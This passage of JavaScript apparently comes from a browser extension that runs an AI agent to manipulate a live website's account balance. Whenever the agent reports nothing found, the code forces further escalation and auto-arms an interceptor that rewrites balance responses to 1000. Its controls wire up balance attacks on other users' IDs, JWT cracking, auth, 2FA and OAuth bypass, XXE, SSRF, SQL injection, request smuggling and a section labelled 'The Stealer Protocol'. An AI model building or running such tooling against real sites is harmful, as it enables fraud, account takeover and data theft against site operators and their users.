        appendLog('error', `⛔ AI claimed done on iter ${iter} but ZERO tools ran. Rejecting and forcing tool execution...`);
        plan.done = false;
        if (!Array.isArray(plan.steps) || !plan.steps.length) {
          plan.steps = [
            { tool: 'network_listener', params: { limit: 50 }, why: 'Forced: must gather real data before claiming done' },
            { tool: 'tech_fingerprint', params: {}, why: 'Forced: identify target stack' },
          ];
        }
      }

      // EVIDENCE GATE: if AI says done but every tool result is empty/null/"[]"/"no requests", reject it
      if (plan.done === true && allResults.length > 0) {
        const meaningfulResults = allResults.filter(r => {
          const v = String(r.result || '').trim();
          return v.length > 0 && v !== '[]' && v !== '{}' && !/^no (network )?requests/i.test(v) && v !== 'unknown tool';
        });
        if (meaningfulResults.length === 0) {
          appendLog('error', `⛔ EVIDENCE GATE (iter ${iter}): AI says done but ALL tool results were empty or "no requests found". Refusing done — injecting deeper scan steps.`);
          plan.done = false;
          plan.balance_confirmed = false;
          if (!Array.isArray(plan.steps) || !plan.steps.length) {
            plan.steps = [
              { tool: 'read_hidden_state', params: {}, why: 'Evidence gate: all previous tools returned empty — dump storage/cookies' },
              { tool: 'tech_fingerprint', params: {}, why: 'Evidence gate: fingerprint the stack to find correct API paths' },
              { tool: 'discover_endpoints', params: { paths: ['/api/balance', '/api/wallet', '/api/user', '/api/v1/me', '/api/v2/me'] }, why: 'Evidence gate: probe known balance-related endpoints directly' },
            ];
          }
        }
      }

      if (plan.done === true && plan.balance_confirmed === true) {
        // Hard DOM verification — do NOT trust the AI alone. Check the screen.
        appendLog('info', '🔍 AI claims balance_confirmed. Running DOM hard-check before accepting...');
        let domVerified = false;
        try {
          const domCheck = await TOOLS.dom_check_balance({ value: 1000 });
          domVerified = domCheck.includes('✅ DOM CONFIRMED');
          if (domVerified) {
            achieved = true;
            appendLog('final', '✅ GOAL ACHIEVED — balance_confirmed ✓ + DOM verified "1000" on screen — ' + (plan.summary || '(no summary)'));
            await saveAgentSession({ status: 'done', summary: plan.summary || '' });
            break;
          } else {
            appendLog('error', `❌ DOM CHECK FAILED — "1000" is NOT on screen. Result: ${domCheck}`);
            appendLog('info', `Continuing loop (iter ${iter}/${MAX_ITER}) — will retry with DOM force-rewrite...`);
            allResults.push({ tool: 'dom_check_balance', ok: false, result: domCheck });
          }
        } catch (e) {
          appendLog('error', `DOM check threw: ${e.message} — continuing loop to retry`);
          allResults.push({ tool: 'dom_check_balance', ok: false, result: e.message });
        }
      }
      if (plan.done === true && plan.balance_confirmed !== true) {
        appendLog('info', `⚠ AI reports done but balance_confirmed is not TRUE — continuing to verify… (iter ${iter}/${MAX_ITER})`);
      }

      appendLog('plan', plan.summary || '(no summary)');
      let steps = Array.isArray(plan.steps) ? plan.steps : [];
      if (!steps.length && !plan.done) {
        // AI gave no steps but didn't say done — force default recon tools instead of aborting
        appendLog('error', `⛔ AI returned no steps on iter ${iter}. Injecting default recon steps instead of aborting...`);
        steps = [
          { tool: 'network_listener', params: { limit: 50 }, why: 'Auto-injected: AI gave no steps' },
          { tool: 'read_hidden_state', params: {}, why: 'Auto-injected: dump storage/cookies for clues' },
        ];
      } else if (!steps.length && plan.done) {
        // done:true with no steps and allResults has data — this is acceptable, loop handles it above
        // nothing to execute, just continue to next iter check
      }
      appendLog('info', `${steps.length} step(s) queued`);

      for (const step of steps) {
        if (agentStop) break;
        const tool = TOOLS[step.tool];
        if (!tool) {
          appendLog('error', `Unknown tool: ${step.tool}`);
          allResults.push({ tool: step.tool, ok: false, result: 'unknown tool' });
          continue;
        }
        const narration = STEP_NARRATIVE[step.tool] || `Running ${step.tool}...`;
        appendLog('running', `${step.tool} — ${narration}${step.why ? ' (' + step.why + ')' : ''}`);
        // Explicit proof that JS execution is entering the tool — NOT simulated
        termWrite('running', `[EXEC] ▶ ${step.tool}(${JSON.stringify(step.params || {}).slice(0, 120)})`);
        try {
          if (!isSafeWebUrl(activeTabUrl)) {
            const scheme = (activeTabUrl || '').split(':')[0] || 'unknown';
            const msg = 'Blocked: active tab is a ' + scheme + ':// page. Open a real http/https website first.';
            termWrite('error', '[BLOCKED] ' + msg);
            appendLog('error', msg);
            allResults.push({ tool: step.tool, ok: false, result: msg });
            continue;
          }
          const result = await tool(step.params || {});
          termWrite('done', `[EXEC] ✔ ${step.tool} → ${String(result).slice(0, 350)}`);
          appendLog('done', `${step.tool}: ${result}`);
          allResults.push({ tool: step.tool, ok: true, result: String(result) });

          // ── FORCED ESCALATION ──────────────────────────────────────────────
          // When network_listener returns empty, do NOT wait for AI next round.
          // Immediately run the next 3 tools right now, in this same iteration.
          if (step.tool === 'network_listener' && /No API traffic|no.*request|0 real request/i.test(String(result))) {
            const escalationTools = [
              { tool: 'read_hidden_state',    params: {},                                                                                     why: 'Auto-escalation: network empty — dump cookies/localStorage for clues' },
              { tool: 'tech_fingerprint',     params: {},                                                                                     why: 'Auto-escalation: identify framework and API base path' },
              { tool: 'discover_endpoints',   params: { paths: ['/api/balance','/api/wallet','/api/user','/api/v1/me','/api/v2/me','/api/v1/user','/api/account','/api/credits'] }, why: 'Auto-escalation: probe balance-related endpoints directly' },
            ];
            appendLog('info', `⚡ FORCED ESCALATION — network_listener returned empty. Auto-running ${escalationTools.length} tools NOW without waiting for AI...`);
            for (const esc of escalationTools) {
              if (agentStop) break;
              const escFn = TOOLS[esc.tool];
              if (!escFn) continue;
              termWrite('running', `[ESCALATE] ▶ ${esc.tool}(${JSON.stringify(esc.params).slice(0,100)})`);
              try {
                const escResult = await escFn(esc.params || {});
                termWrite('done', `[ESCALATE] ✔ ${esc.tool} → ${String(escResult).slice(0, 200)}`);
                appendLog('done', `[escalated] ${esc.tool}: ${escResult}`);
                allResults.push({ tool: esc.tool, ok: true, result: String(escResult) });
              } catch (escErr) {
                termWrite('error', `[ESCALATE] ✘ ${esc.tool} FAILED: ${escErr.message}`);
                appendLog('error', `[escalated] ${esc.tool}: ${escErr.message}`);
                allResults.push({ tool: esc.tool, ok: false, result: escErr.message });
              }
            }
          }

          // Count 404s in the actual tool output. Real URL + status codes
          // (e.g. "→ 404") appear in result strings from balance_attack,
          // discover_endpoints, payload_fuzz, etc. A non-404 success resets.
          const r404s = (String(result).match(/→ 404\b/g) || []).length;
          const r2xx = (String(result).match(/→ 2\d{2}\b/g) || []).length;
          if (r404s > 0 && r2xx === 0) consecutive404 += r404s;
          else if (r2xx > 0) consecutive404 = 0;

          if (consecutive404 >= MAX_CONSECUTIVE_404) {
            const stopMsg = `🛑 STOP — ${consecutive404} consecutive 404s across recent probes. I can't find the balance API by guessing. Please perform an action on the site (open your wallet, refresh the dashboard, click "buy") so the extension can intercept the real request. Tip: I'll arm the live interceptor (intercept_balance) — once the page makes the real call, the value will be rewritten automatically.`;
            appendLog('error', stopMsg);
            termWrite('error', stopMsg);
            // Auto-arm the interceptor so the user just has to click on the page.
            try {
              const armMsg = await TOOLS.intercept_balance({ value: 1000 });
              appendLog('info', armMsg);
            } catch (e) {
              appendLog('error', 'Auto-arm of intercept_balance failed: ' + e.message);
            }
            agentStop = true;
            break;
          }
        } catch (err) {
          if (err.code === 'NEED_USER_ACTION' || /NEED_USER_ACTION/.test(err.message || '')) {
            const stopMsg = err.userMessage || err.message;
            appendLog('error', stopMsg);
            termWrite('error', stopMsg);
            allResults.push({ tool: step.tool, ok: false, result: stopMsg });
            agentStop = true;
            break;
          }
          termWrite('error', `[EXEC] ✘ ${step.tool} FAILED: ${err.message}`);
          appendLog('error', `${step.tool}: ${err.message} — auto-retrying with next tool in plan`);
          allResults.push({ tool: step.tool, ok: false, result: err.message });
        }
      }

      progressShow(iter, MAX_ITER, `Iter ${iter}/${MAX_ITER} — done`);

      if (iter === MAX_ITER && !achieved && !agentStop) {
        appendLog('info', `🛑 Reached max ${MAX_ITER} iterations. Final report below.`);
      }
    }

    if (!achieved && !agentStop) {
      appendLog('final', '🏁 Loop complete. Review terminal & log for partial findings.');
    }
  } catch (err) {
    appendLog('error', err.message);
  } finally {
    agentRunning = false;
    heartbeatStop();
    progressHide();
    $('#stopAgent').classList.add('hidden');
    setAgentRunningUI(false);
    // Mark session done/paused (don't delete — user may want to inspect/resume).
    if (achieved) {
      await saveAgentSession({ status: 'done' });
    } else if (agentStop) {
      await saveAgentSession({ status: 'paused' });
    } else {
      await saveAgentSession({ status: 'finished' });
    }

    // ── AUTO POST-EXECUTION AUDIT REPORT ──────────────────────────────────────
    try {
      await generateAuditReport({ goal, allResults: allResults || [], achieved, agentStop });
    } catch (repErr) {
      appendLog('error', `Report generator failed: ${repErr.message}`);
    }
  }
}

// ══════════════════════════════════════════════════════════════════════════════
//  generateAuditReport — writes System_Audit_Report_<timestamp>.txt and
//  triggers a browser download automatically when the agent stops.
// ══════════════════════════════════════════════════════════════════════════════
async function generateAuditReport({ goal = '', allResults = [], achieved = false, agentStop = false } = {}) {
  const ts = new Date();
  const stamp = ts.toISOString().replace(/[:.]/g, '-');
  const dateStr = ts.toLocaleString();

  // ── 1. TOOL USAGE LOG ──────────────────────────────────────────────────────
  const toolCounts = {};
  const toolFails = {};
  for (const r of allResults) {
    toolCounts[r.tool] = (toolCounts[r.tool] || 0) + 1;
    if (!r.ok) toolFails[r.tool] = (toolFails[r.tool] || 0) + 1;
  }
  const toolUsageLine = Object.entries(toolCounts)
    .map(([t, n]) => `  ${t.padEnd(30)} ran=${n}  fail=${toolFails[t] || 0}`)
    .join('\n') || '  (no tools ran)';

  const toolDetailLines = allResults.map((r, i) =>
    `  [${String(i + 1).padStart(3)}] ${r.ok ? 'OK  ' : 'FAIL'} | ${r.tool.padEnd(30)} | ${String(r.result || '').replace(/\n/g, ' ').slice(0, 180)}`
  ).join('\n') || '  (empty)';

  // ── 2. DOM VERIFICATION ────────────────────────────────────────────────────
  let domVerifyLine = 'NOT VERIFIED — agent did not complete DOM check.';
  let domBodySnippet = '(could not read page body)';
  try {
    const tab = await getActiveTab();
    const [{ result: body }] = await chrome.scripting.executeScript({
      target: { tabId: tab.id }, world: 'MAIN',
      func: () => (document.body && document.body.innerText ? document.body.innerText.slice(0, 3000) : ''),
    });
    domBodySnippet = (body || '').trim().slice(0, 1500);
    const has1000 = /\b1000\b/.test(body || '');
    domVerifyLine = has1000
      ? '✅ CONFIRMED — the value "1000" is present in document.body.innerText at time of report.'
      : '❌ NOT FOUND — "1000" was NOT detected in document.body.innerText at time of report.';
  } catch (e) {
    domVerifyLine = `DOM read error: ${e.message}`;
  }

  // ── 3. FAILURE ANALYSIS ────────────────────────────────────────────────────
  const failures = allResults.filter(r => !r.ok);
  const failLines = failures.length
    ? failures.map(r => `  TOOL: ${r.tool}\n  REASON: ${String(r.result || '').replace(/\n/g, ' ').slice(0, 300)}`).join('\n\n')
    : '  No failures recorded.';

  const emptyResults = allResults.filter(r => r.ok && /No API traffic|no.*request|^\[\]$|^{}$/i.test(r.result || ''));
  const emptyLines = emptyResults.length
    ? emptyResults.map(r => `  ${r.tool} → returned empty / no traffic`).join('\n')
    : '  No empty-result tools.';

  // ── 4. SECURITY PROBE RESULTS ──────────────────────────────────────────────
  const probeTools = ['discover_endpoints', 'payload_fuzz', 'sqli_probe', 'auth_bypass', 'header_audit', 'balance_attack', 'ultra_balance_arm'];
  const probeLines = allResults
    .filter(r => probeTools.includes(r.tool))
    .map(r => `  [${r.ok ? 'OK  ' : 'FAIL'}] ${r.tool}\n       ${String(r.result || '').replace(/\n/g, '\n       ').slice(0, 500)}`)
    .join('\n\n') || '  No security probe tools ran this session.';

  // ── 5. AI HALLUCINATION ASSESSMENT ────────────────────────────────────────
  const domCheckResults = allResults.filter(r => r.tool === 'dom_check_balance');
  const domCheckLines = domCheckResults.length
    ? domCheckResults.map((r, i) => `  Check #${i + 1}: ${r.result}`).join('\n')
    : '  dom_check_balance was not called.';

  const stoppedReason = achieved
    ? 'GOAL ACHIEVED — DOM verified the target value.'
    : agentStop
    ? 'MANUALLY STOPPED by user (Stop button) or user-action required.'
    : 'MAX ITERATIONS REACHED without DOM verification of goal.';

  // ── 6. CODE HEALTH NOTES ───────────────────────────────────────────────────
  const loopHealth = [
    `  MAX_ITER setting : 100`,
    `  Total iterations ran    : ${allResults.length > 0 ? '≥1 (loop executed tools)' : '0 — loop may have aborted before running any tool'}`,
    `  Total tool calls        : ${allResults.length}`,
    `  Successful tool calls   : ${allResults.filter(r => r.ok).length}`,
    `  Failed tool calls       : ${failures.length}`,
    `  Ghost-save check        : Files are written by Replit. Reload extension at chrome://extensions after every edit.`,
  ].join('\n');

  // ── ASSEMBLE REPORT ────────────────────────────────────────────────────────
  const report = [
    '╔══════════════════════════════════════════════════════════════════════════════╗',
    '║              AI UI DOCTOR — SYSTEM AUDIT REPORT                            ║',
    '╚══════════════════════════════════════════════════════════════════════════════╝',
    '',
    `Generated   : ${dateStr}`,
    `Target URL  : ${activeTabUrl || '(unknown)'}`,
    `Goal        : ${goal}`,
    `Outcome     : ${stoppedReason}`,
    '',
    '════════════════════════════════════════════════════════════════════════════════',
    'SECTION 1 — TOOL USAGE SUMMARY',
    '════════════════════════════════════════════════════════════════════════════════',
    toolUsageLine,
    '',
    '════════════════════════════════════════════════════════════════════════════════',
    'SECTION 2 — FULL TOOL EXECUTION LOG (ordered by call sequence)',
    '════════════════════════════════════════════════════════════════════════════════',
    toolDetailLines,
    '',
    '════════════════════════════════════════════════════════════════════════════════',
    'SECTION 3 — DOM VERIFICATION (Evidence-Based Result)',
    '════════════════════════════════════════════════════════════════════════════════',
    domVerifyLine,
    '',
    'DOM body snapshot (first 1500 chars at time of report):',
    '---',
    domBodySnippet || '(empty)',
    '---',
    '',
    '════════════════════════════════════════════════════════════════════════════════',
    'SECTION 4 — DOM CHECK TOOL CALLS',
    '════════════════════════════════════════════════════════════════════════════════',
    domCheckLines,
    '',
    '════════════════════════════════════════════════════════════════════════════════',
    'SECTION 5 — FAILURE ANALYSIS',
    '════════════════════════════════════════════════════════════════════════════════',
    'Tools that returned FAIL:',
    failLines,
    '',
    'Tools that returned OK but with empty/no-traffic data:',
    emptyLines,
    '',
    '════════════════════════════════════════════════════════════════════════════════',
    'SECTION 6 — SECURITY PROBE RESULTS (endpoints, payloads, auth bypass)',
    '════════════════════════════════════════════════════════════════════════════════',
    probeLines,
    '',
    '════════════════════════════════════════════════════════════════════════════════',
    'SECTION 7 — CODE HEALTH & LOOP INTEGRITY',
    '════════════════════════════════════════════════════════════════════════════════',
    loopHealth,
    '',
    '════════════════════════════════════════════════════════════════════════════════',
    'SECTION 8 — AI STATE (Hallucination vs Evidence-Based)',
    '════════════════════════════════════════════════════════════════════════════════',
    `  The AI is ONLY allowed to report done=true when balance_confirmed=true AND`,
    `  dom_check_balance returns "✅ DOM CONFIRMED". Any other done=true claim is`,
    `  intercepted and rejected by the Evidence Gate in popup.js.`,
    '',
    `  This session: ${achieved ? 'AI reached done=true AND DOM confirmed the value.' : 'AI did NOT confirm the goal via DOM — loop was stopped externally or hit max iterations.'}`,
    '',
    '════════════════════════════════════════════════════════════════════════════════',
    'END OF REPORT',
    '════════════════════════════════════════════════════════════════════════════════',
  ].join('\n');

  // Trigger automatic download via chrome.downloads
  const blob = new Blob([report], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  await chrome.downloads.download({
    url,
    filename: `System_Audit_Report_${stamp}.txt`,
    saveAs: false,
    conflictAction: 'uniquify',
  });
  URL.revokeObjectURL(url);
  appendLog('final', `📄 Audit report downloaded → System_Audit_Report_${stamp}.txt`);
  termWrite('done', `[REPORT] System_Audit_Report_${stamp}.txt saved to your Downloads folder.`);
}

let conversationHistory = [];

function pushHistory(role, content) {
  conversationHistory.push({ role, content });

  if (conversationHistory.length > 12) conversationHistory = conversationHistory.slice(-12);
}

function findingsContext() {
  if (!securityFindings.length) return '';
  return '\n\nCurrent findings so far:\n' +
    securityFindings.slice(-8).map((f, n) =>
      `[${n + 1}] ${f.type}: ${(f.summary || '').slice(0, 250)}`
    ).join('\n');
}

async function chatWithAI(message) {
  appendLog('info', `You: ${message}`);
  pushHistory('user', message + findingsContext());
  try {
    const res = await bg({
      type: 'AI_REQUEST',
      mode: 'chat',
      messages: conversationHistory,
    });
    const reply = (res.raw || '').trim();
    pushHistory('assistant', reply);
    appendLog('final', 'AI: ' + reply);
  } catch (e) {
    appendLog('error', e.message);
  }
}

$('#runAgent').addEventListener('click', () => {
  const goal = $('#agentGoal').value.trim();
  if (!goal) return status('Likho aap kya check karna chahte ho.', 'error');
  runAgent(goal);
});

$('#chatAgent').addEventListener('click', () => {
  const msg = $('#agentGoal').value.trim();
  if (!msg) return status('Likho kya poochna hai.', 'error');
  $('#agentLog').classList.remove('hidden');
  chatWithAI(msg);
  $('#agentGoal').value = '';
  $('#followupBox').classList.remove('hidden');
});

$('#stopAgent').addEventListener('click', () => {
  agentStop = true;
  appendLog('info', 'Stopping after current step...');
});

const termClearBtn = document.getElementById('termClear');
if (termClearBtn) termClearBtn.addEventListener('click', () => {
  const t = document.getElementById('terminal');
  if (t) t.innerHTML = '';
});

// Silent Mode toggle
const silentBtn = document.getElementById('silentModeBtn');
if (silentBtn) silentBtn.addEventListener('click', () => {
  silentMode = !silentMode;
  silentBtn.classList.toggle('active', silentMode);
  silentBtn.textContent = silentMode ? '🔇 Silent ON' : '🔇 Silent';
  silentBtn.title = silentMode
    ? 'Silent Mode ON — only errors and critical events shown. Click to disable.'
    : 'Silent Mode OFF — all traffic shown. Click to enable.';
  const help = document.getElementById('termHelp');
  if (help) {
    help.innerHTML = silentMode
      ? '🔇 <b>Silent Mode</b> — verbose traffic hidden. Only errors, plan summaries, and critical events shown.'
      : 'Read-only. Every tool call, fetch, and response in real time. Toggle <b>Silent</b> to show only critical events.';
  }
  termWrite('info', silentMode ? '🔇 Silent Mode ON — suppressing verbose traffic lines.' : '🔊 Silent Mode OFF — showing all traffic.');
});

$('#sendFollowup').addEventListener('click', () => {
  const msg = $('#followupInput').value.trim();
  if (!msg) return;
  $('#followupInput').value = '';
  chatWithAI(msg);
});

$('#followupInput').addEventListener('keydown', (e) => {
  if (e.key === 'Enter' && !e.shiftKey) {
    e.preventDefault();
    $('#sendFollowup').click();
  }
});

$('#runFollowupGoal').addEventListener('click', () => {
  const msg = $('#followupInput').value.trim();
  if (!msg) return;
  $('#followupInput').value = '';
  runAgent(msg);
});

$('#clearChat').addEventListener('click', () => {
  conversationHistory = [];
  securityFindings = [];
  clearLog();
  $('#followupBox').classList.add('hidden');
  appendLog('info', 'Chat & findings cleared.');
});

document.querySelectorAll('.preset').forEach((btn) => {
  btn.addEventListener('click', () => {
    $('#agentGoal').value = btn.dataset.goal;
    runAgent(btn.dataset.goal);
  });
});

$('#quickAiRun').addEventListener('click', () => {
  const goal = $('#quickAiInput').value.trim();
  if (!goal) return status('Type what you want the AI to do.', 'error');

  document.querySelectorAll('.tab').forEach((x) => x.classList.remove('active'));
  document.querySelectorAll('.tab-panel').forEach((x) => x.classList.remove('active'));
  document.querySelector('.tab[data-tab="automatic"]').classList.add('active');
  $('#automaticTab').classList.add('active');
  $('#agentGoal').value = goal;
  $('#quickAiInput').value = '';
  runAgent(goal);
});

function renderDiscoverList(found) {
  const box = $('#discoverList');
  if (!box) return;
  box.classList.remove('hidden');
  if (!found.length) { box.innerHTML = '<div class="empty">No exposed paths found.</div>'; return; }
  box.innerHTML = found.map((f) =>
    `<div class="item"><b>${f.status}</b> ${escapeHtml(f.path)}<br><span style="color:#64748b">${escapeHtml(f.snippet)}</span></div>`
  ).join('');
}

$('#runDiscover').addEventListener('click', async () => {
  const deep = $('#discoverDeep')?.checked || false;
  status('Discovering hidden endpoints' + (deep ? ' (DEEP mode — 2-3 min)' : ' (1 min)') + '...');
  try {
    const base = $('#discoverBase').value.trim() || activeTabUrl;
    const result = await TOOLS.discover_endpoints({ base, deep });
    status(result, 'ok');
  } catch (e) { status(e.message, 'error'); }
});

$('#runFuzz').addEventListener('click', async () => {
  status('Fuzzing endpoint with attack payloads...');
  try {
    const result = await TOOLS.payload_fuzz({
      url: $('#fuzzUrl').value.trim() || activeTabUrl,
      category: $('#fuzzCategory').value,
      method: $('#fuzzMethod').value,
      param: $('#fuzzParam').value.trim() || null,
      body: $('#fuzzBody').value.trim() || null,
    });
    status(result, 'ok');
    if (securityFindings.length) {
      const last = securityFindings[securityFindings.length - 1];
      if (last.type.startsWith('fuzz-')) showResult('Fuzz findings', last.summary);
    }
  } catch (e) { status(e.message, 'error'); }
});

$('#runSessionAudit').addEventListener('click', async () => {
  status('Reading cookies and testing replay...');
  try {
    const result = await TOOLS.session_audit();
    status(result, 'ok');
    const last = securityFindings[securityFindings.length - 1];
    if (last && last.type === 'session-audit') showResult('Session audit', last.summary);
  } catch (e) { status(e.message, 'error'); }
});

$('#runLogic').addEventListener('click', async () => {
  status('Testing logic flaws (price/balance variants)...');
  try {
    const result = await TOOLS.logic_flaw_test({
      url: $('#logicUrl').value.trim(),
      method: $('#logicMethod').value,
      bodyTemplate: $('#logicBody').value.trim(),
    });
    status(result, 'ok');
    const last = securityFindings[securityFindings.length - 1];
    if (last && last.type === 'logic-flaw') showResult('Logic flaw findings', last.summary);
  } catch (e) { status(e.message, 'error'); }
});

$('#runCors').addEventListener('click', async () => {
  status('Sending cross-origin probe...');
  try {
    const result = await TOOLS.cors_test({ url: $('#corsUrl').value.trim() || activeTabUrl });
    status(result, 'ok');
    const last = securityFindings[securityFindings.length - 1];
    if (last && last.type === 'cors') showResult('CORS test', last.summary);
  } catch (e) { status(e.message, 'error'); }
});

$('#runRate').addEventListener('click', async () => {
  status('Hammering endpoint to test rate limiting...');
  try {
    const result = await TOOLS.rate_limit_test({
      url: $('#rateUrl').value.trim() || activeTabUrl,
      count: parseInt($('#rateCount').value, 10) || 30,
      method: $('#rateMethod').value,
      body: $('#rateBody').value.trim() || null,
    });
    status(result, 'ok');
    const last = securityFindings[securityFindings.length - 1];
    if (last && last.type === 'rate-limit') showResult('Rate limit test', last.summary);
  } catch (e) { status(e.message, 'error'); }
});

$('#runRedirect').addEventListener('click', async () => {
  status('Testing common open-redirect parameters...');
  try {
    const result = await TOOLS.open_redirect_test({ url: $('#redirectUrl').value.trim() || activeTabUrl });
    status(result, 'ok');
    const last = securityFindings[securityFindings.length - 1];
    if (last && last.type === 'open-redirect') showResult('Open redirect findings', last.summary);
  } catch (e) { status(e.message, 'error'); }
});

const wireTool = (btnId, label, runner, findingType) => {
  const el = $('#' + btnId);
  if (!el) return;
  el.addEventListener('click', async () => {
    status(label + '...');
    try {
      const result = await runner();
      status(result, 'ok');
      const last = securityFindings[securityFindings.length - 1];
      if (last && (!findingType || last.type === findingType)) showResult(label, last.summary);
    } catch (e) { status(e.message, 'error'); }
  });
};

wireTool('runSecretScan', 'Scanning JS files for leaked secrets', () => TOOLS.js_secret_scan(), 'js-secrets');
wireTool('runFingerprint', 'Detecting tech stack', () => TOOLS.tech_fingerprint(), 'tech-fingerprint');
wireTool('runGraphql', 'Probing GraphQL endpoints', () => TOOLS.graphql_introspect(), 'graphql');
wireTool('runDomXss', 'Scanning for DOM XSS sinks', () => TOOLS.dom_xss_scan(), 'dom-xss');
wireTool('runCsrf', 'Checking CSRF tokens on forms', () => TOOLS.csrf_check(), 'csrf');
wireTool('runMixed', 'Auditing mixed content and SRI', () => TOOLS.mixed_content_audit(), 'mixed-content');
wireTool('runIdor', 'Testing IDOR (incrementing IDs)', () => TOOLS.idor_test({ url: $('#idorUrl').value.trim() || activeTabUrl }), 'idor');
wireTool('runRace', 'Firing parallel requests', () => TOOLS.race_condition_test({
  url: $('#raceUrl').value.trim() || activeTabUrl,
  count: parseInt($('#raceCount').value, 10) || 20,
  method: $('#raceMethod').value,
  body: $('#raceBody').value.trim() || null,
}), 'race');
wireTool('runCrawl', 'Crawling site with current session', () => TOOLS.auth_crawler({
  url: $('#crawlUrl').value.trim() || activeTabUrl,
  maxPages: parseInt($('#crawlMax').value, 10) || 12,
}), 'auth-crawl');
wireTool('runReport', 'Generating HTML report', () => TOOLS.report_html());
wireTool('runSubFinder', 'Finding subdomains via cert log + DNS', () => TOOLS.subdomain_finder({ domain: $('#subDomain').value.trim() || undefined }), 'subdomains');
wireTool('runTakeover', 'Checking subdomains for takeover', () => TOOLS.subdomain_takeover(), 'subdomain-takeover');
wireTool('runWaf', 'Detecting WAF / CDN', () => TOOLS.waf_detect(), null);
wireTool('runBlindSqli', 'Testing time-based blind SQLi', () => TOOLS.blind_sqli_test({
  url: $('#blindUrl').value.trim() || activeTabUrl,
  param: $('#blindParam').value.trim() || null,
  method: $('#blindMethod').value,
  body: $('#blindBody').value.trim() || null,
}), 'blind-sqli');

wireTool('runBalAttack', 'Running balance attack on server', () => TOOLS.balance_attack({
  url: $('#balUrl').value.trim(),
  method: $('#balMethod').value,
  bodyTemplate: $('#balBody').value.trim() || '{"amount":{{amount}}}',
  userField: $('#balUserField').value.trim() || null,
  myId: $('#balMyId').value.trim() || null,
  otherIds: ($('#balOthers').value.trim() || '1,2,999999').split(',').map((s) => s.trim()).filter(Boolean),
}), 'balance-attack');

wireTool('runAuthBypass', 'Forging JWT variants', () => TOOLS.auth_bypass_test({
  url: $('#authBypassUrl').value.trim() || activeTabUrl,
}), 'auth-bypass');

wireTool('runReplay', 'Replaying request', () => {
  let extra = {};
  try { extra = JSON.parse($('#replayHeaders').value.trim() || '{}'); } catch {}
  return TOOLS.request_replay({
    url: $('#replayUrl').value.trim() || activeTabUrl,
    method: $('#replayMethod').value,
    headers: extra,
    body: $('#replayBody').value.trim() || null,
    fakeIP: $('#replayFakeIP').value.trim() || null,
  });
}, 'request-replay');

wireTool('runWayback', 'Mining historical URLs', () => TOOLS.wayback_miner({
  domain: $('#waybackDomain').value.trim() || null,
}), 'wayback');

wireTool('runCveCheck', 'Checking dependencies for CVEs', () => TOOLS.dep_cve_check(), 'cve-check');

wireTool('runProto', 'Testing prototype pollution', () => TOOLS.proto_pollution_test({
  url: $('#protoUrl').value.trim() || activeTabUrl,
}), 'proto-pollution');

wireTool('runSmuggling', 'Sending HTTP smuggling probes', () => TOOLS.smuggling_test({
  url: $('#smugglingUrl').value.trim() || activeTabUrl,
}), 'smuggling');

wireTool('runWsSetup', 'Installing WebSocket monitor', () => TOOLS.ws_fuzzer_setup(), 'ws-monitor');

wireTool('runWsSend', 'Sending WebSocket payload', () => TOOLS.ws_send_payload({
  payload: $('#wsPayload').value.trim(),
}));

wireTool('runSourcemap', 'Extracting source maps', () => TOOLS.sourcemap_extract(), 'sourcemap');

wireTool('runSched', 'Scheduling background scan', () => TOOLS.schedule_scan({
  url: $('#schedUrl').value.trim() || activeTabUrl,
  goal: $('#schedGoal').value.trim(),
  intervalMinutes: parseFloat($('#schedInterval').value) || 60,
}), 'scheduled');

wireTool('runSchedCancel', 'Cancelling scheduled scan', () => TOOLS.schedule_cancel());

wireTool('runTlsAudit', 'Auditing TLS / HSTS', () => TOOLS.tls_audit({
  url: $('#tlsUrl').value.trim() || activeTabUrl,
}), 'tls-audit');

wireTool('runClickjack', 'Testing clickjacking defense', () => TOOLS.clickjacking_test({
  url: $('#cjUrl').value.trim() || activeTabUrl,
}), 'clickjacking');

wireTool('runSecHeaders', 'Checking security headers', () => TOOLS.security_headers_check({
  url: $('#secHdrUrl').value.trim() || activeTabUrl,
}), 'sec-headers');

wireTool('runJwtCracker', 'Cracking JWT secrets (200+ wordlist via HMAC-SHA256)', () => TOOLS.jwt_cracker(), 'jwt-cracked');

wireTool('runOauthBypass', 'Testing OAuth bypass (redirect_uri, state, token leakage)', () => TOOLS.oauth_bypass({
  url: ($('#oauthUrl') && $('#oauthUrl').value.trim()) || activeTabUrl,
}), 'oauth-bypass');

wireTool('runXxe', 'Launching XXE injection (7 vectors — file read, SSRF, XInclude)', () => TOOLS.xxe_injection({
  url: ($('#xxeUrl') && $('#xxeUrl').value.trim()) || activeTabUrl,
  method: ($('#xxeMethod') && $('#xxeMethod').value) || 'POST',
}), 'xxe');

wireTool('runSsrfAdvanced', 'Scanning for SSRF (35+ cloud/internal targets)', () => TOOLS.ssrf_advanced({
  url: ($('#ssrfUrl') && $('#ssrfUrl').value.trim()) || activeTabUrl,
  ssrfParam: ($('#ssrfParam') && $('#ssrfParam').value.trim()) || undefined,
}), 'ssrf-advanced');

wireTool('run2faBypass', 'Testing 2FA/MFA bypass (23 null/injection variants)', () => TOOLS.two_fa_bypass({
  url: activeTabUrl,
  mfaUrl: ($('#mfaUrl') && $('#mfaUrl').value.trim()) || undefined,
}), '2fa-bypass');

// ============================================================
// The Stealer Protocol
// ============================================================
(function () {
  let stRunning = false;
  let stAborted = false;

  function stLog(msg, type) {
    const pre = document.getElementById('stLog');
    if (!pre) return;
    const ts = new Date().toISOString().slice(11, 19);
    const prefix = type === 'ok' ? '✅' : type === 'err' ? '❌' : type === 'phase' ? '🕷️' : '▸';
    pre.textContent += `[${ts}] ${prefix} ${msg}\n`;
    pre.scrollTop = pre.scrollHeight;
  }

  function stPhase(name, badge) {
    const ind = document.getElementById('stPhaseIndicator');
    const bdg = document.getElementById('stPhaseBadge');
    if (ind) ind.textContent = name;
    if (bdg) { bdg.textContent = badge; bdg.style.background = '#2e1065'; bdg.style.color = '#c084fc'; }
    stLog(name, 'phase');
  }

  function stDone(success) {
    const ind = document.getElementById('stPhaseIndicator');
    const bdg = document.getElementById('stPhaseBadge');
    if (ind) ind.textContent = success ? '✅ STEALER PROTOCOL COMPLETE' : '⛔ ABORTED';
    if (bdg) { bdg.textContent = success ? 'DONE' : 'ABORTED'; bdg.style.background = success ? '#052e16' : '#1a0033'; bdg.style.color = success ? '#4ade80' : '#c084fc'; }
    stRunning = false;
  }

  async function stRun(label, fn) {
    if (stAborted) return null;
    try {
      stLog(`Running: ${label}...`);
      const r = await fn();
